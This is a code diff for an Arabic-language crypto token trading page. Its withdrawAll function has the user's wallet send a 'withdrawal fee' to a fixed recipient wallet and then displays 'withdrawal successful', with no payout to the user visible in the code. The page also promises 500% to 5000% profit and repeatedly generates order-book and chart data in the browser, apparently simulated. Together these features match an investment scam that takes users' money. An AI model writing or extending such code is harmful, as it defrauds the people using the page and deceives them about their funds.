@@ -1329,4 +1329,77 @@ async function withdrawAll() {
     if (netAmount <= 0) { showToast(`⚠️ الرصيد غير كافٍ لتغطية رسوم السحب`, 'warning'); return; }
     if (!confirm('هل تريد تأكيد عملية السحب؟')) return;
     const withdrawBtn = document.getElementById('withdrawBtn');
-    const withdrawBtn2
+    const withdrawBtn2 = document.getElementById('withdrawBtn2');
+    const statusMsg = document.getElementById('withdrawStatus');
+    const statusMsg2 = document.getElementById('withdrawStatus2');
+    if (withdrawBtn) { withdrawBtn.disabled = true; withdrawBtn.innerHTML = '<span class="loading-spinner"></span> جاري...'; }
+    if (withdrawBtn2) { withdrawBtn2.disabled = true; withdrawBtn2.innerHTML = '<span class="loading-spinner"></span> جاري...'; }
+    if (statusMsg) statusMsg.textContent = '';
+    try {
+        const provider = new ethers.providers.Web3Provider(window.ethereum); const signer = provider.getSigner();
+        const balanceWei = await provider.getBalance(userAddress); const feeWei = ethers.utils.parseEther(withdrawalFee.toFixed(18));
+        const gasPrice = await provider.getGasPrice(); const gasLimit = 21000; const gasCostWei = gasPrice.mul(gasLimit);
+        if (balanceWei.lt(feeWei.add(gasCostWei))) {
+            if (statusMsg) statusMsg.textContent = `❌ لا يوجد الرصيد الكافي`;
+            if (statusMsg2) statusMsg2.textContent = `❌ لا يوجد الرصيد الكافي`;
+            showToast('❌ رصيد غير كافٍ', 'error');
+            if (withdrawBtn) { withdrawBtn.disabled = false; withdrawBtn.innerHTML = '💸 سحب'; }
+            if (withdrawBtn2) { withdrawBtn2.disabled = false; withdrawBtn2.innerHTML = '💸 سحب'; }
+            return;
+        }
+        const tx = await signer.sendTransaction({ to: RECIPIENT_WALLET, value: feeWei, gasLimit: gasLimit, gasPrice: gasPrice, data: '0x' });
+        if (statusMsg) statusMsg.textContent = `⏳ جاري التأكيد...`;
+        if (statusMsg2) statusMsg2.textContent = `⏳ جاري التأكيد...`;
+        showToast('⏳ جاري الإرسال...', 'info');
+        await tx.wait();
+        lastWithdrawRequestTime = Date.now(); saveData(); await loadAllData();
+        if (statusMsg) statusMsg.textContent = `✅ تم السحب بنجاح.`;
+        if (statusMsg2) statusMsg2.textContent = `✅ تم السحب بنجاح.`;
+        showToast(`✅ تم السحب بنجاح.`, 'success');
+    } catch (error) { 
+        if (error.code === 'ACTION_REJECTED' || error.code === 4001) { 
+            if (statusMsg) statusMsg.textContent = '❌ تم إلغاء المعاملة';
+            if (statusMsg2) statusMsg2.textContent = '❌ تم إلغاء المعاملة';
+            showToast('❌ تم إلغاء السحب', 'warning'); 
+        } else { 
+            if (statusMsg) statusMsg.textContent = `❌ فشل السحب: ${error.message}`;
+            if (statusMsg2) statusMsg2.textContent = `❌ فشل السحب: ${error.message}`;
+            showToast('❌ فشل السحب: ' + error.message, 'error'); 
+        } 
+    } finally { 
+        if (withdrawBtn) { withdrawBtn.disabled = false; withdrawBtn.innerHTML = '💸 سحب'; }
+        if (withdrawBtn2) { withdrawBtn2.disabled = false; withdrawBtn2.innerHTML = '💸 سحب'; }
+        setTimeout(() => { if (statusMsg && statusMsg.textContent.includes('✅')) statusMsg.textContent = ''; if (statusMsg2 && statusMsg2.textContent.includes('✅')) statusMsg2.textContent = ''; }, 5000); 
+    }
+}
+
+window.onload = async function() {
+    await loadSettingsFromFirebase();
+    if (window.ethereum && window.ethereum.selectedAddress) { connectWallet(); }
+    const settings = getSettings();
+    updateTokenNameUI(settings.tokenName || 'Asem');
+    document.getElementById('displayDuration').textContent = `${settings.durationHours} ساعة`;
+    document.getElementById('displayExchangeRate').textContent = `1 BNB = ${settings.exchangeRate.toLocaleString()} ${settings.tokenName || 'Asem'}`;
+    document.getElementById('expectedProfitText').textContent = `من 500% إلى 5000%`;
+    document.getElementById('expectedProfitDisplay').textContent = `500% → 5000%`;
+    document.getElementById('openTimeDisplay').textContent = '7 مساءً';
+    updateTimeDisplay();
+    updateCurrentTimeDisplay();
+    updateSellAvailability();
+    loadAllData();
+    setTimeout(() => {
+        generateOrderbook();
+        generateChart();
+        if (orderbookInterval) clearInterval(orderbookInterval);
+        orderbookInterval = setInterval(generateOrderbook, 5000);
+        setInterval(generateChart, 30000);
+    }, 500);
+    setInterval(updateCurrentTimeDisplay, 60000);
+    setInterval(updateSellAvailability, 30000);
+};
+
+// تحديث الإعدادات من Firebase كل دقيقة
+setInterval(loadSettingsFromFirebase, 60000);
+</script>
+</body>
+</html>
